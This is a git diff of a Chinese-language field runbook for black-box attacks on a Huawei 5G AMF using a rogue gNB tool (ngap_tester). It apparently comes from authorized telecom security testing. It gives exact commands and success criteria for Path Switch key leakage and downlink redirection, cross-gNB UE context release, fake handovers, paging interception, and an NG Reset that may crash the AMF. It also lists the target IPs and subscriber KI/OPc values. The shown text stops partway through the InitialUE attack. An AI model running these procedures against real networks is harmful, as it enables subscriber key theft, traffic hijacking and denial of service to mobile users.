@@ -1,615 +1,780 @@
-# 华为 AMF 操作手册（现场实测）
+# 华为 AMF 操作手册（现场实测 · 黑盒）
 
-文件：`deploy/操作手册_华为AMF.md`。测试机是 **Ubuntu**。现场改不了代码，只按本节命令跑。
-合法 UERANSIM 和流氓 ngap_tester 是同一个华为 AMF 上的两个 gNB。
+文件：`deploy/操作手册_华为AMF.md`。测试机 **Ubuntu**。现场改不了代码，只按这里的命令跑。
 
-**华为 AMF-UE-NGAP-ID 每次注册都随机。禁止 sweep。禁止用菜单里的 CASE id。**
+合法 UERANSIM 和流氓 `ngap_tester` 是同一华为 AMF 上的两个 gNB，**共用源 IP** `13.254.241.142`。
+华为 **AMF-UE-NGAP-ID 每次注册随机**。禁止 `sweep`。禁止菜单「Run attack CASE by id」。
 
----
-
-**按编号一个一个做。现在做攻击 2。攻击 1 测完不要再打，也不要叠在同一条 UE 会话上。**
+**按编号一条一条做。已做过的跳过。破坏会话的打完必须重注册再读 AU。`ng-reset` 放最后。**
 
 全部命令在**仓库根目录**（能同时 `ls deploy/extract-ue-ids.sh config/huawei.json`）。
-克隆目录叫什么都行，不要死记 `~/ngap_tester`。
+
+```bash
+git pull
+chmod +x deploy/*.sh deploy/real-amf/*.sh
+./deploy/selftest-encode.sh    # 不连 AMF，确认每条报文还能编出来
+./deploy/field-check.sh        # 全绿再往下
+```
 
 ---
 
-## 攻击 1：Path Switch（已测就跳过）
+## 黑盒怎么观测（每条攻击都用这一套）
 
-测完不要再打。复测必须重新注册再读 AU。
+华为 AMF 内部状态你看不到。能用的只有四路。**四路对不上就不要写「成功」**。
 
-### A. 准备（每个终端都先 `cd` 到仓库根）
+| 路 | 是什么 | 怎么开 |
+|---|---|---|
+| 1 终端 C | 流氓进程打印 | `./deploy/ngt.sh …` |
+| 2 终端 A/B | 合法 gNB / UE 日志 | `run-gnb.sh` / `run-ue.sh` |
+| 3 N2 pcap | 本机 ↔ `14.66.2.5` 的 SCTP/NGAP | 攻击**之前**开抓 |
+| 4 会话/数据面 | AU 还在不在、tun、GTP-U | `observe.sh` / `check-up.sh` |
+
+若华为给了少量 AMF 日志：只当第 5 路。搜 IMSI `460081111111113`、gNB `4660`、下面每条写的关键词。没有日志也能结案。
+
+### 每条攻击的固定节奏
+
+```text
+1. 合法侧已注册（A/B 开着）
+2. 终端 D：./deploy/real-amf/observe.sh before <攻击名>
+3. 终端 F：sudo ./deploy/real-amf/capture-n2.sh <攻击名>     # 先开
+4. （只有 Path Switch / HO 切面才开）终端 E：gtpu-sink；终端 G：capture-n3.sh
+5. 终端 C：打这一条
+6. 立刻看 A/B/C
+7. 终端 D：./deploy/real-amf/observe.sh after <攻击名>
+8. 终端 F Ctrl-C，然后：./deploy/real-amf/decode-n2.sh evidence/n2-<攻击名>-*.pcap
+9. 按下表填记录。UE 若掉了：重跑 run-ue.sh，再 extract-ue-ids.sh
+```
+
+### N2 抓包（黑盒主证据）
+
+合法 gNB 和流氓**同一源 IP**，pcap 里靠 **SCTP 端口 + 时间** 对齐终端 C。
+`decode-n2.sh` 会打出 `procedureCode`、Info、AU。对照下面每条的「应出现的 proc」。
 
 ```bash
-ls deploy/extract-ue-ids.sh config/huawei.json
-chmod +x deploy/*.sh deploy/real-amf/*.sh
-./deploy/field-check.sh
+sudo ./deploy/real-amf/capture-n2.sh path-switch
+./deploy/real-amf/decode-n2.sh evidence/n2-path-switch-*.pcap
 ```
+
+| proc | 报文 |
+|---|---|
+| 21 | NGSetup |
+| 25 | PathSwitch |
+| 42 | UEContextReleaseRequest |
+| 41 | UEContextRelease Command / Complete |
+| 9 | ErrorIndication |
+| 20 | NGReset |
+| 12 | HandoverRequired |
+| 13 | HandoverRequest / Ack |
+| 11 | HandoverNotify |
+| 15 | InitialUEMessage |
+| 35 | RANConfigurationUpdate |
+| 48 / 47 | UL / DL RAN Configuration Transfer |
+| 24 | Paging |
+| 30 | PDUSessionResourceNotify |
+| 2 | CellTrafficTrace |
+| 49 | UL RAN Status Transfer |
+| 50 | UL UE-assoc NRPPa |
+
+### N3 抓包（只为切面）
+
+```bash
+sudo ./deploy/real-amf/capture-n3.sh path-switch
+tshark -r evidence/n3-path-switch-*.pcap -Y gtp -T fields -e ip.src -e ip.dst -e gtp.teid
+```
+
+### 读 AU / GUTI
+
+```bash
+./deploy/extract-ue-ids.sh          # 不要 sudo；抄 amf-ngap-id
+./deploy/extract-ue-ids.sh --guti   # InitialUE 两条才需要
+```
+
+GUTI 也可从终端 B 日志搜 `GUTI` / `5G-S-TMSI` / `TMSI`，或从注册过程的 N2 pcap 用 `decode-n2.sh` 看 5G-TMSI 那一段。
+
+| 字段 | 填谁 |
+|---|---|
+| `amf-ngap-id` | `--amf-ue-id` / `--source-amf-ue-id` |
+| AMF Set ID（10 bit） | `--amf-set-id 0x…` |
+| AMF Pointer（6 bit） | `--amf-pointer 0x…` |
+| 5G-TMSI（4 字节） | `--tmsi` 八位 hex，如 `c000019c` |
+
+### 三条铁律
+
+1. **不要用上次的 AU。** UE 一重注册就作废。
+2. **不要把两条破坏性攻击叠在同一会话上**（Path Switch 后再打 Release = 攻击 9，不是攻击 2）。
+3. **终端 C 无回 ≠ 失败。** Class-2 本来就常常不回攻击者。看 pcap 和受害侧。
+
+### 现场不要做
+
+| 不要 | 原因 |
+|---|---|
+| `sweep` | 华为 AU 随机 |
+| 菜单 CASE id | AU 写死 1，N3 写死 `172.30.200.9` |
+| `./run.sh`（Docker） | 连的是实验室核心网 |
+| 停终端 A | 没有受害 UE，也看不到 Command 有没有打到合法 gNB |
+| ping `8.8.8.8` | 内网常禁外网 ICMP |
+
+---
+
+## 共用准备（每条攻击前）
+
+每个终端先 `cd` 到仓库根。
 
 | 终端 | 作用 | 命令 | 停不停 |
 |---|---|---|---|
 | A | 合法 gNB | `./deploy/real-amf/run-gnb.sh` | 一直开着 |
 | B | 合法 UE | `./deploy/real-amf/run-ue.sh` | 一直开着 |
-| D | 读 AU / 看数据面 | 见下面 | 用完即可 |
-| E | 接被切走的下行 GTP-U | 攻击**之前**先开 | 一直开到打完 |
-| C | 流氓 gNB，只发 path-switch | 见下面 | 打一条就退出 |
+| D | 读 AU / observe | 见上 | 用完即可 |
+| F | N2 抓包 | `sudo ./deploy/real-amf/capture-n2.sh <名>` | 打完再停 |
+| C | 只打当前这一条 | 见各节 | 打一条就退出 |
+| E | `gtpu-sink` | 仅攻击 1 / 5 / 9 | 打完再停 |
 
-终端 A 看到 `NG Setup procedure is successful`。  
-终端 B 看到 `Registration is successful` + `PDU Session establishment is successful`，并出现 `uesimtun0`。
-
-### B. 确认会话和内网数据面（不要 ping 8.8.8.8）
-
-```bash
-./deploy/real-amf/check-up.sh
-./deploy/real-amf/check-up.sh --n3
-# 华为若给了 DNN 内网地址：
-PING_TARGET=<地址> ./deploy/real-amf/check-up.sh
-```
-
-记下：`uesimtun0` 的 UE_IP、网关是否回包、`--n3` 是否看到 UDP 2152。  
-有 UE_IP = 会话已建。N6 不回 ping 也继续（华为常禁 ICMP）。
-
-### C. 读这一次的 AMF-UE-NGAP-ID（AU）
-
-```bash
-./deploy/extract-ue-ids.sh          # 不要 sudo
-```
-
-抄输出里的 **`amf-ngap-id`**，这就是 `$AU`。没有的话：
-
-```bash
-~/UERANSIM/build/nr-cli --dump
-~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
-```
-
-gNB 名字以 `--dump` 里 `UERANSIM-gnb-` 那行为准。  
-**禁止 sweep。禁止用上次的 AU。** UE 一重注册必须重读。
-
-### D. 流氓侧探路（终端 C）
+终端 A：`NG Setup procedure is successful`。  
+终端 B：`Registration is successful` + `PDU Session establishment is successful`，有 `uesimtun0`。
 
 ```bash
 ./deploy/ngt.sh sctp-ping
 # 必须 SUCCESS，源 IP = 13.254.241.142
 ./deploy/ngt.sh ng-setup
-# 必须 ACCEPTED。REJECT = 4660/PLMN/切片没开通，不要往下打
+# 必须 ACCEPTED。REJECT = 4660/PLMN/切片没开通，下面都不要打
 ```
 
 华为允许多条 SCTP，**不要停终端 A**。
 
-### E. 开 GTP-U 接收（终端 E，先于攻击）
+---
+
+## 现场参数
+
+| 项 | 值 |
+|---|---|
+| IMSI | `460081111111113` |
+| KI | `1234567890abcde1234567890abcde12` |
+| OPc | `FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF`（`UE1_OP_TYPE=OPC`） |
+| PLMN | MCC `460` / MNC `08` |
+| TAC | `1` |
+| S-NSSAI | SST `1` / SD `010101` |
+| AMF | `14.66.2.5:38412` |
+| 本机源 IP | `13.254.241.142` |
+| 合法 gNB-ID | `1` |
+| 流氓 gNB-ID | `4660` |
+| DNN | `huawei.com` |
+
+写在 `deploy/real-amf/real-amf.env` 和 `config/huawei.json`。改完重启对应进程。
+
+---
+
+## 攻击顺序（按这个表往下）
+
+| # | 命令 | 要 AU？ | 会拆 UE？ | 建议 |
+|---|---|---|---|---|
+| 1 | `path-switch` | 要 | 可能改绑 | 先做；做完重注册 |
+| 2 | `ue-release` | 要 | 可能 | 新会话，不要叠 1 |
+| 3 | `error-indication` | 要 | 可能 | 新会话 |
+| 4 | `handover-required` | 要 | 可能 | 新会话 |
+| 5 | `ho-window-inject` | 要 | 可能 | 新会话；可开 sink |
+| 6 | `ran-config-update` | 否 | 否 | 可复用会话 |
+| 7 | `ul-ran-config-transfer` | 否 | 否 | 看终端 A |
+| 8 | `initial-ue` | GUTI | 可能搅乱 | 先 `--guti` |
+| 9 | `chain-ps-release` | 要 | 是 | 新会话 |
+| 10 | `chain-initue-release` | GUTI+AU | 可能 | 先 `--guti` |
+| 11 | `handover-notify` | 要 | 可能 | Class-2 |
+| 12 | `pdu-notify` | 要 | 少见 | Class-2 |
+| 13 | `cell-trace` | 要 | 少见 | Class-2 |
+| 14 | `ul-ran-status` | 要 | 少见 | Class-2 |
+| 15 | `ul-nrppa` | 要 | 少见 | Class-2 |
+| 16 | `ng-reset` | 要 | 可能 + **可能打挂 AMF** | **最后做** |
+
+11–15 若 UE 还活着、AU 没变，可以同一会话连打，每条仍要单独抓 N2、单独填表。
+
+下面每条都是：命令 → 黑盒看什么 → 记录。`<AU>` 一律换成**这一次** `extract-ue-ids.sh` 的 `amf-ngap-id`。
+
+---
+
+## 攻击 1：Path Switch
+
+流氓声称自己是新 serving，要 {NH,NCC}，并把下行 N3 指到本机。
+
+**前提：** 新注册。开 sink + N3 抓包。
 
 ```bash
+./deploy/real-amf/observe.sh before path-switch
+# 终端 F
+sudo ./deploy/real-amf/capture-n2.sh path-switch
+# 终端 G（可选）
+sudo ./deploy/real-amf/capture-n3.sh path-switch
+# 终端 E
 ./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
-```
-
-保持开着。攻击前这里应接近安静（下行还在合法 gNB）。
-
-### F. 只打 Path Switch（终端 C）
-
-把 `<AU>` 换成 C 步抄的数字，不要改其它参数：
-
-```bash
+# 终端 C
 mkdir -p evidence
 ./deploy/ngt.sh --evidence evidence/huawei-path-switch.jsonl \
     path-switch --source-amf-ue-id <AU> --pdu-sessions 1
 ```
 
-`--attacker-ip` 默认 `auto`，会绑到 `13.254.241.142`，不要改成实验室的 172.30。
+`--attacker-ip` 默认 `auto`，会落到 `13.254.241.142`，不要改成 172.30。
 
-### G. 怎么判断成没成（当场填）
+**黑盒看什么**
 
-**控制面（看终端 C 打印）：**
-
-| 终端 C 打印（字面） | 记什么 |
-|---|---|
-| `=== CROSS-gNB DISCLOSURE CONFIRMED ===` 且 `LEAKED KEY MATERIAL: NCC=… NH=…` | **控制面成功**（主证据，把 NCC/NH 整行抄下来） |
-| 还有 `LEAKED UPF N3 ENDPOINT` | 额外泄了 UPF 地址/TEID，整行抄下来 |
-| `PathSwitchRequestAcknowledge` 但只有 `PDU … ack-transfer (no UL-TNL…)` | ACK 了、没泄 UPF N3；有没有 NH 分开记 |
-| `PathSwitchRequestFailure` 或 `ErrorIndication` | 华为挡了，把 `reply:` 那一行整行抄下来 |
-| `[path-switch] no reply (victim id likely not resolvable / rejected silently)` | AU 错/过期，或包没到。重做 C 步再打一次 |
-
-**数据面（内网）：**
-
-| 观察 | 成功切面时 | 没切面时 |
+| 路 | 成功 | 挡住 / 无效 |
 |---|---|---|
-| 终端 E `gtpu-sink` | 出现 GTP-U | 仍然没有 |
-| `check-up.sh --n3`（合法 gNB 的 2152） | 变少或没有 | 和打之前差不多 |
-| `check-up.sh` ping 网关/`PING_TARGET` | 若本来通，现在可能断 | 和打之前一样 |
+| 终端 C | `CROSS-gNB DISCLOSURE CONFIRMED` + `LEAKED KEY MATERIAL: NCC=… NH=…` | `PathSwitchRequestFailure` / ErrorIndication / `no reply` |
+| 终端 C 另 | `LEAKED UPF N3 ENDPOINT`（有则抄） | 只有 `ack-transfer (no UL-TNL…)` = ACK 了但没泄 UPF |
+| N2 pcap | 上行 proc **25**，下行 `PathSwitchRequestAcknowledge` | 下行 Failure / Error / 无下行 |
+| 终端 E / N3 | sink 出现 GTP-U | sink 仍安静 |
+| `check-up.sh --n3` | 合法侧 2152 变少 | 和打前一样 |
+| AMF 日志 | Path Switch / gNB 4660 / 该 IMSI | 拒绝 / 无此 UE |
 
-控制面有 NH、数据面没切：也算成立（Open5GS 2.8 就是这样）。两层都写进表。
-
-### H. 本条记录表（复制下来填）
+控制面有 NH、数据面没切：也算控制面成立（Open5GS 2.8 就是这样）。两层分开记。
 
 ```
-日期:
-AU（amf-ngap-id）:
-UE_IP / 网关 / ping 是否通（打前）:
-N3 合法侧 2152 打前有没有:
-sctp-ping:
-ng-setup:
-path-switch 回复（ACK/Failure/无回）:
-NH:
-NCC:
-UPF N3（有则抄）:
-gtpu-sink 打后有没有包:
-合法侧 2152 打后:
-ping 打后:
-备注:
+日期 / AU:
+C 整段（NCC/NH/N3）:
+N2：有无 ACK（proc 25 下行）:
+sink / 合法侧 2152 打后:
+结论（泄密钥 / 泄 N3 / 切面 / 挡住 / 无回）:
 ```
 
-打完若还要复测：先让终端 B 的 UE 重新注册，**重新 C 步读 AU**，再从 E/F 来。
-
-### 这次不要做
-
-| 不要 | 原因 |
-|---|---|
-| `ue-release` / `error-indication` / `ng-reset` / 其它 `$NGT` | 这次只测 Path Switch |
-| `sweep` | 华为 AU 随机 |
-| 菜单「Run attack CASE by id」 | AU 写死 1，N3 写死 172.30.200.9 |
-| `./run.sh`（Docker） | 连的是实验室核心网 |
-| 停终端 A 再打 | 华为允许多条 SCTP；停了就没有受害 UE |
+做完重注册。不要在这个 AU 上接着打 2。
 
 ---
 
-## 攻击 2：UE Context Release（本次）
+## 攻击 2：UE Context Release
 
-流氓 gNB 对**别人的** AU 发 `UEContextReleaseRequest`。看华为会不会把受害 UE 拆掉。
+对别人的 AU 发 `UEContextReleaseRequest`。看会不会拆受害 UE。
 
-**必须用新注册、没打过 Path Switch 的会话。** 攻击 1 刚打完的话：终端 B 里 `Ctrl-C`，再 `./deploy/real-amf/run-ue.sh`，等再次 `Registration is successful`，然后重新读 AU。  
-这条**不要开** `gtpu-sink`（不切 N3）。**不要**再打 `path-switch` / `chain-ps-release`。
-
-开源上四栈四结果，华为是新靶，只按下面现象填，不要套旧结论：
-
-| 开源对照（仅参考） | 攻击者这边 | 受害 UE |
-|---|---|---|
-| Open5GS / free5GC | 回 ErrorIndication 或拒绝 | 还活着 |
-| OAI | 把 Release Command 发回攻击者 | 还活着 |
-| SD-Core | 命令发到**合法 gNB**，攻击者常无回 | **断连** |
-
-### A. 准备（每个终端先 `cd` 到仓库根）
-
-合法侧若已在跑且 UE **刚重新注册过**，A/B 不用重来，从 C 步读 AU 开始。
+**前提：** 新注册，**没打过** Path Switch。不要 sink。
 
 ```bash
-ls deploy/extract-ue-ids.sh config/huawei.json
-```
-
-| 终端 | 作用 | 命令 | 停不停 |
-|---|---|---|---|
-| A | 合法 gNB | `./deploy/real-amf/run-gnb.sh` | 一直开着 |
-| B | 合法 UE | `./deploy/real-amf/run-ue.sh` | 一直开着 |
-| D | 读 AU / 打前打后看会话 | 见下面 | 用完即可 |
-| C | 只发 ue-release | 见下面 | 打一条就退出 |
-
-终端 A：`NG Setup procedure is successful`。  
-终端 B：`Registration is successful` + `PDU Session establishment is successful`，有 `uesimtun0`。
-
-### B. 打前基线（不要 ping 8.8.8.8）
-
-```bash
-./deploy/real-amf/check-up.sh
-./deploy/real-amf/check-up.sh --n3
-# 华为若给了 DNN 内网地址：
-PING_TARGET=<地址> ./deploy/real-amf/check-up.sh
-```
-
-记下：UE_IP、ping 通不通、`--n3` 有没有 UDP 2152。  
-再看一眼终端 A、终端 B 最后几行，后面对照有没有「Release / Radio link / 掉注册」。
-
-### C. 读这一次的 AU
-
-```bash
-./deploy/extract-ue-ids.sh          # 不要 sudo
-```
-
-抄 **`amf-ngap-id`** = `$AU`。没有则：
-
-```bash
-~/UERANSIM/build/nr-cli --dump
-~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
-```
-
-gNB 名字以 `--dump` 里 `UERANSIM-gnb-` 为准。  
-**禁止 sweep。禁止用攻击 1 的旧 AU。**
-
-### D. 流氓侧探路（终端 C）
-
-```bash
-./deploy/ngt.sh sctp-ping
-# 必须 SUCCESS，源 IP = 13.254.241.142
-./deploy/ngt.sh ng-setup
-# 必须 ACCEPTED
-```
-
-华为允许多条 SCTP，**不要停终端 A**。
-
-### E. 只打 UE Release（终端 C）
-
-把 `<AU>` 换成 C 步的数字。`--ran-ue-id` 不要加（默认 1，是流氓自己的本地 ID，不是受害者的）。
-
-```bash
-mkdir -p evidence
+./deploy/real-amf/observe.sh before ue-release
+sudo ./deploy/real-amf/capture-n2.sh ue-release
 ./deploy/ngt.sh --evidence evidence/huawei-ue-release.jsonl \
     ue-release --amf-ue-id <AU>
 ```
 
-### F. 打后立刻看这四处
+不要加 `--ran-ue-id`（默认 1 是流氓本地 ID）。
 
-1. **终端 C**（抄 `->` 后面整行）
-2. **终端 A**（合法 gNB 有没有 UE Context Release / Radio link failure / UE 被拆）
-3. **终端 B**（UE 还在不在 CM-CONNECTED、有没有重新注册、`uesimtun0` 还在不在）
-4. **终端 D**
+**黑盒看什么**
 
-```bash
-./deploy/extract-ue-ids.sh
-./deploy/real-amf/check-up.sh
-./deploy/real-amf/check-up.sh --n3
+| 路 | 跨 gNB 释放成立 | 挡住 / 无效 |
+|---|---|---|
+| 终端 C | 常 `(no reply to us)` | `ErrorIndication`；或自己收到 `UEContextReleaseCommand`（命令回弹） |
+| 终端 A | 出现 Release / UE 被拆 / Radio link | 无变化 |
+| 终端 B / observe | 掉注册、tun 没了、ue-list 空 | 还是同一 AU，tun 还在 |
+| N2 pcap | 上行 proc **42**；**另一条 SCTP** 上下行出现 proc **41**（Command 打到合法 gNB） | 只有 42，或 42 后对流氓回 Error（proc 9） |
+| AMF 日志 | 该 IMSI 上下文释放 | 拒绝 / unknown UE / not in this RAN |
+
+C 无回 + A 出现 Release + UE 掉 = **成立**。  
+C 回 Error + UE 还活 = **挡住**。  
+C 回 Command + UE 还活 = 命令打回攻击者。  
+C 无回 + UE 没变 = AU 错或静默丢，重读 AU 再打一次。
+
+```
+日期 / AU:
+C 整行:
+N2：42 之后 41 出现在哪条 SCTP（合法 / 流氓 / 没有）:
+A / B / observe 打后:
+结论:
 ```
 
-`ue-list` 空了或 AU 变了、tun 没了、N3 没了 = 受害侧有变化。
+---
 
-### G. 怎么判断成没成（当场填）
+## 攻击 3：Error Indication
 
-**控制面（终端 C 字面）：**
+对别人的 AU 发 `ErrorIndication`（cause=`unknown-local-UE-NGAP-ID`）。有的栈会当成本地 UE 出错并释放。
 
-| 终端 C 打印 | 先记这个，再对受害侧 |
-|---|---|
-| `-> unsuccessfulOutcome/proc=… ErrorIndication` 或带 `ErrorIndication` | 华为对攻击者回了错。还要看受害死没死 |
-| `-> successfulOutcome/proc=41 UEContextReleaseCommand` 或带 `UEContextReleaseCommand` | 命令回到了**攻击者**（开源 OAI 是这样）。受害往往还活着，以 A/B 为准 |
-| `[ue-release] amf=… ran=1 -> (no reply to us)` | **常见。** 命令可能发去合法 gNB（成功切面），也可能被静默丢。**必须看 A/B/D** |
-| 其它 `reply` | 整行抄下来 |
+**前提：** 新会话。不要 sink。
 
-**受害侧（这才是本条成不成）：**
+```bash
+./deploy/real-amf/observe.sh before error-indication
+sudo ./deploy/real-amf/capture-n2.sh error-indication
+./deploy/ngt.sh --evidence evidence/huawei-error-indication.jsonl \
+    error-indication --amf-ue-id <AU>
+```
 
-| 观察 | 跨 gNB 释放成功 | 被挡住 / 无效 |
+**黑盒看什么**
+
+| 路 | 成立（受害被拆） | 挡住 / 忽略 |
 |---|---|---|
-| 终端 A | 出现 Release / UE 被拆 / Radio link | 和打之前一样 |
-| 终端 B | 掉注册、PDU 没了、`uesimtun0` 没了 | 还在、还显示会话成功 |
-| `extract-ue-ids.sh` | `ue-list` 空，或 AU 已经不是刚才那个 | 还是同一个 `amf-ngap-id` |
-| `check-up.sh` / `--n3` | tun 没了，或 ping/2152 没了 | 和打前一样 |
+| 终端 C | 无回或随后有释放类报文 | ErrorIndication 回弹 / 无回且受害无变化 |
+| 终端 A | Release / 掉 UE | 无变化 |
+| observe | AU 没了、tun 没了 | 同一 AU |
+| N2 pcap | 上行 proc **9**；合法侧随后 proc **41** | 只有 9，或 AMF 对流氓回 9 |
+| AMF 日志 | 该 IMSI 释放 / unknown UE 处理后释放 | 丢弃 / 绑定检查失败 |
 
-终端 C 无回 + 终端 A 出现 Release + UE 掉线 = **本条成立**（SD-Core 那一类）。  
-终端 C 回 ErrorIndication + UE 还活着 = **华为挡住了**（也是有效结论，照实记）。  
-终端 C 无回 + UE 完全没变 = AU 错/过期，或包没到：重读 AU 再打一次；仍无变化就记「无回且受害无变化」。
+```
+日期 / AU:
+C:
+N2：proc 9 之后合法侧有无 41:
+A/B/observe:
+结论（拆了 / 挡住 / 无回且无变化）:
+```
 
-### H. 本条记录表（复制下来填）
+---
+
+## 攻击 4：Handover Required
+
+流氓替受害 UE 发 `HandoverRequired`，目标写成**不存在的** gNB `0xABCDE`（默认）。看 AMF 会不会对别人的上下文开切换。
+
+**前提：** 新会话。不要改 `--target-gnb-id`（这条就是「指向假目标」）。指向自己是攻击 5。
+
+```bash
+./deploy/real-amf/observe.sh before handover-required
+sudo ./deploy/real-amf/capture-n2.sh handover-required
+./deploy/ngt.sh --evidence evidence/huawei-ho-required.jsonl \
+    handover-required --amf-ue-id <AU>
+```
+
+**黑盒看什么**
+
+| 路 | AMF 接受了跨 gNB HO | 挡住 |
+|---|---|---|
+| 终端 C | 有回（Failure / Command / 其它）或长时间无回 | 明确 Failure / ErrorIndication |
+| 终端 A | HO Command / 准备切换 / 随后 Release | 无变化 |
+| 终端 B | 掉线或尝试切换失败 | 还注册 |
+| N2 pcap | 上行 proc **12**；合法侧出现 HandoverCommand 或 41 | 只有 12，或对流氓回 Failure |
+| AMF 日志 | Handover / target 找不到 / 该 IMSI 进 HO | 拒绝 / UE 不属于该 gNB |
+
+假目标常常以 Failure 收场——**Failure 也要抄 cause**，说明它有没有按 AU 找到了受害上下文。
+
+```
+日期 / AU:
+C 整行:
+N2：12 之后下行是什么、打到哪条 SCTP:
+A/B 是否被搅动:
+结论（按 AU 开了 HO / 挡住 / 无变化）:
+```
+
+---
+
+## 攻击 5：HO-window inject
+
+同一条 SCTP：`HandoverRequired`（目标=**自己 4660**）→ 等 `HandoverRequest` → Ack → 再塞 p21（RAN Status）和 p09（HandoverNotify）。
+
+**前提：** 新会话。建议开 sink（Ack 里带了攻击者 N3）。
+
+```bash
+./deploy/real-amf/observe.sh before ho-window
+sudo ./deploy/real-amf/capture-n2.sh ho-window
+./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
+./deploy/ngt.sh --evidence evidence/huawei-ho-window.jsonl \
+    ho-window-inject --amf-ue-id <AU> --mode both
+```
+
+**黑盒看什么**
+
+| 路 | 窗口打开 | 打不开 |
+|---|---|---|
+| 终端 C | `got HandoverRequest`，打印 target-amf / target-ran | `NO HandoverRequest`（到此停止，下面 p21/p09 不会发） |
+| 终端 C 随后 | `DownlinkRANStatusTransfer` = p21 中继；或合法侧被 Release | 只有 Ack，无后续 |
+| N2 pcap | 12 → 13（HO Request 打到流氓）→ Ack → 49 和/或 11 | 只有 12，然后 Failure |
+| 终端 A | 源侧 HO Command / 后来 Release | 无变化 |
+| observe / sink | UE 掉或下行到 sink | 同一 AU，sink 安静 |
+| AMF 日志 | HO prepare / target 4660 | 拒绝 HO / unknown target |
+
+```
+日期 / AU:
+有无 HandoverRequest（C 打印的 target-amf）:
+p21 是否看到 DownlinkRANStatusTransfer:
+p09 之后 A/B 是否掉:
+N2 时间线（12/13/11/49/41）:
+结论:
+```
+
+`NO HandoverRequest` 就停，不要改参数连打。记「窗口未开」即可。
+
+---
+
+## 攻击 6：RAN Configuration Update（假 TAI / 寻呼）
+
+流氓再声明一遍 TAC=1。看 AMF 会不会把寻呼也扇到 4660。
+
+**前提：** 可复用会话（不拆 UE）。黑盒往往**触发不了下行寻呼**——没有寻呼也要记 ACK。
+
+```bash
+sudo ./deploy/real-amf/capture-n2.sh ran-config
+./deploy/ngt.sh --evidence evidence/huawei-ran-config.jsonl \
+    ran-config-update --listen 30
+```
+
+30 秒内若华为/核心网能给该 IMSI 推一条下行（有人配合就让他们做），你可能看到 `PAGING INTERCEPTED`。没人配合就等到超时。
+
+**黑盒看什么**
+
+| 路 | 拓扑声称被接受 | 挡住 |
+|---|---|---|
+| 终端 C | 打印 `RANConfigurationUpdateAcknowledge` 一类 ACK | Failure / 无 ack |
+| 终端 C 30s | `[PAGING INTERCEPTED] 5G-S-TMSI=…` | 无 Paging（黑盒常见） |
+| N2 pcap | 上行 proc **35**，下行 ACK；若有寻呼则 proc **24** 打到流氓 SCTP | Failure |
+| 终端 A | 若有寻呼，合法侧也会收到 Paging | 无变化 |
+| AMF 日志 | RAN config / TAI 更新 / Paging | 拒绝 |
 
 ```
 日期:
-AU（amf-ngap-id，必须是本条新注册的）:
-打前：UE_IP / ping / 合法侧 2152:
-sctp-ping:
-ng-setup:
-终端 C 整行（-> 后面）:
-终端 A 打后有无 Release / 掉 UE:
-终端 B 打后是否还注册 / tun 还在不在:
-extract-ue-ids 打后（还是同一 AU / 空 / 新 AU）:
-check-up 打后:
-结论（挡住 / 命令回攻击者受害还活 / 合法 gNB 被拆受害断 / 无回且无变化）:
-备注:
+C：ACK 还是 Failure:
+有无 PAGING（有则抄 5G-S-TMSI）:
+N2：35 下行；有无 24:
+结论（声称被接受 / 挡住 / 接受但无寻呼可测）:
 ```
-
-复测：终端 B 重新注册，**重新读 AU**，再从 E 打。不要用旧数字。
-
-### 这次不要做
-
-| 不要 | 原因 |
-|---|---|
-| 在攻击 1 刚 Path Switch 过的同一 AU 上打本条 | 测的就不是「跨 gNB 裸释放」了 |
-| `path-switch` / `chain-ps-release` / `error-indication` / `ng-reset` | 这次只测 ue-release |
-| `sweep` | 华为 AU 随机 |
-| 菜单「Run attack CASE by id」 | AU 写死 1 |
-| 停终端 A | 没有合法 gNB 就看不到 Command 有没有打到受害侧 |
-| 改 `--ran-ue-id` | 受害者靠 `--amf-ue-id`，不要改 |
 
 ---
 
-## 0. 现场已开户参数
+## 攻击 7：UL RAN Configuration Transfer（SON 盲中继）
 
-| 项 | 值 | 写在哪 |
+让 AMF 把 SON/Xn 配置转到合法 gNB-ID `1`。看终端 A 会不会收到 `DownlinkRANConfigurationTransfer`。
+
+**前提：** 合法 gNB 必须在。不要 AU。
+
+```bash
+sudo ./deploy/real-amf/capture-n2.sh son
+./deploy/ngt.sh --evidence evidence/huawei-son.jsonl \
+    ul-ran-config-transfer --target-gnb-id 1
+```
+
+**黑盒看什么**
+
+| 路 | 盲中继成立 | 丢掉 |
 |---|---|---|
-| IMSI | `460081111111113` | `deploy/real-amf/real-amf.env` |
-| KI | `1234567890abcde1234567890abcde12` | 同上 |
-| OPc | `FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF` | 同上（`UE1_OP_TYPE=OPC`） |
-| PLMN | MCC `460` / MNC `08` | env + `config/huawei.json` |
-| TAC | `1` | 同上 |
-| S-NSSAI | SST `1` / SD `010101` | env 里 `0x010101`，json 里 `"010101"` |
-| AMF | `14.66.2.5:38412` | 同上 |
-| 本机源 IP | `13.254.241.142` | env `HOST_IP`；json `bind_ip` |
-| 合法 gNB-ID | `1`（`NCI=0x000000010`） | env |
-| 流氓 gNB-ID | `4660` | `huawei.json`（必须已被华为允许） |
+| 终端 C | 打印已发送（Class-2） | — |
+| 终端 A | `Unhandled NGAP` / RAN Configuration Transfer / 异常 | 完全无新日志 |
+| N2 pcap | 上行 proc **48**（流氓）；随后 **47** 打到**另一条** SCTP（合法 gNB） | 只有 48 |
+| AMF 日志 | SON / RAN config transfer / target gNB 1 | 无邻居 / 丢弃 |
 
-改参数只改这两个文件，然后**重启**对应进程（脚本会重新渲染 yaml）。
+```
+日期:
+终端 A 打后多了什么:
+N2：48 之后有无 47、47 的目的 SCTP 是不是合法侧:
+结论（中继到合法 gNB / 未中继）:
+```
 
 ---
 
-## 1. 三个终端（参考；本次按文首 Path Switch 做）
+## 攻击 8：InitialUE（用 5G-S-TMSI 开新上下文）
 
-都在**仓库根目录**。**先起合法侧，再起流氓侧。不要停 UERANSIM。**
+不带 AU，用受害 GUTI 发 `InitialUEMessage`（明文 Service Request）。看 AMF 会不会另开一条上下文、回 NAS、改 serving。
 
-```
-终端 A  ./deploy/real-amf/run-gnb.sh      # 合法 gNB，保持开着
-终端 B  ./deploy/real-amf/run-ue.sh       # 合法 UE，保持开着
